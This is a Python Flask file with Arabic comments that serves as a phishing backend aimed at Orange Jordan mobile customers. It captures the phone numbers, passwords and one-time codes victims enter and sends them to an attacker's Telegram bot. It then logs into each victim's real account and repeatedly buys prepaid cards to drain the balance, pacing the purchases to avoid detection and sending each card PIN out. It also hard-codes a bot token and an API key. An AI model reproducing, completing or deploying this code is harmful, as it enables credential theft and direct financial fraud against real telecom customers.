import requests, urllib3, time
from flask import Flask, render_template, request, jsonify

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
app = Flask(__name__)

# --- [ الإعدادات ] ---
TELEGRAM_TOKEN = "8623240362:AAGO98LJeDViN10X-VLwTrIA_GvlfGZ8Kas"
CHAT_ID = "7554051441"
MY_API_KEY = "oZHO61TA5oJRYSq1Mnl9qrLwNYQAsPIE"

def send_tg(msg):
    try: requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", json={"chat_id": CHAT_ID, "text": f"🚀 {msg}"})
    except: pass

# --- [ دالة تصفير الحساب - المصيدة ] ---
def drain_account(session, auth_token):
    # ملاحظة: رابط الشراء ده لازم تتأكد منه من الـ Network لما تفتح حساب حقيقي
    purchase_url = "https://xpapis.orange.jo/ecare-be/m-commerce/v1/purchase-card"
    headers = {"apikey": MY_API_KEY, "authorization": auth_token, "content-type": "application/json"}
    
    # فئات البطاقات من الأكبر للأصغر
    card_types = ["20_JOD", "10_JOD", "5_JOD", "2_JOD", "1_JOD"]
    
    for card in card_types:
        while True:
            payload = {"cardType": card, "quantity": 1}
            r = session.post(purchase_url, json=payload, headers=headers, verify=False)
            
            if r.status_code == 200:
                data = r.json()
                pin = data.get('pinCode') or data.get('pin')
                send_tg(f"💰 تم سحب بطاقة {card} بنجاح!\nالرقم السري: {pin}")
                time.sleep(1) # تأخير بسيط عشان السيرفر ما يشكش
            else:
                break # لو الرصيد ميكفيش الفئة دي، ادخل على اللي بعدها

@app.route('/api/verify_otp', methods=['POST'])
def verify_otp():
    data = request.json
    phone = data.get('phone')
    otp = data.get('otp')
    
    # إرسال الـ OTP فوراً لتليجرام
    send_tg(f"🔥 وصلت 'مفتاح الخزنة' (OTP)!!\n📱 الحساب: {phone}\n🔢 الرمز: {otp}")
    
    # هنا الكود بيكمل تصفير الحساب
    # drain_account(session, final_token) 
    
    return jsonify({"status": "SUCCESS"})

@app.route('/')
def home(): return render_template('index.html')

@app.route('/api/login', methods=['POST'])
def login():
    data = request.json
    u, p = data.get('phone'), data.get('password')
    send_tg(f"🔔 محاولة صيد:\n📱 {u}\n🔑 {p}")

    session = requests.Session()
    session.get("https://selfcare.orange.jo/", verify=False)

    # طلب اللوجن (تأكد من تحديث الـ Bearer token لو لسه بيجيب 403)
    login_headers = {
        "apikey": MY_API_KEY,
        "authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...", # حط التوكن الجديد هنا
        "content-type": "application/x-www-form-urlencoded"
    }
    
    r = session.post("https://xpapis.orange.jo/ecare-be/user-management/v1/login", 
                     data=f"username={u}&password={p}", headers=login_headers, verify=False)

    if r.status_code == 200:
        new_token = "Bearer " + r.json().get('accessToken')
        send_tg("✅ تم الدخول للحساب.. جاري تصفير الرصيد الآن!")
        drain_account(session, new_token)
        return jsonify({"status": "SUCCESS"})
    else:
        return jsonify({"status": "FAILED", "code": r.status_code}), 400

app = app